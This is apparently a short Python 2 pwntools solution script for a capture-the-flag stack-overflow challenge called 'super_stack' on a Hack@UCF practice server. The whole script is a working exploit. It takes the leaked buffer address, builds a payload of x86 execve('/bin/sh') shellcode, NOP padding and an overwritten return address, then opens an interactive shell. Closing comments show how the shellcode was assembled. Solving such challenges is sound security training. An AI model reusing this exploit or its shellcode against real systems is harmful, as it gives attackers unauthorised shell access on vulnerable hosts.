from pwn import *

returnOffset = 112

# p = process(['./super_stack'], env={"LD_PRELOAD":"./libpwnableharness32.so"})

p = remote('ctf.hackucf.org', 9005)
p.recvuntil(': ')

bufAddress = int(p.recvuntil('\n', drop=True), 16)

print hex(bufAddress)

sc = '\x31\xc0\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xd2\x31\xc9\x89\xe3\x6a\x06\x58\x40\x40\x40\x40\x40\xcd\x80'


payload = sc
payload += chr(0x90) * (returnOffset - len(sc))
payload += p32(bufAddress)

print payload

p.sendline(payload)

print p.recvline()

p.interactive()
p.close()

# nasm shellcode_no_null.S -o shell.bin
# hexdump -v -e '1/1 "\\"' -e '1/1 "x%02x"' shell.bin ; echo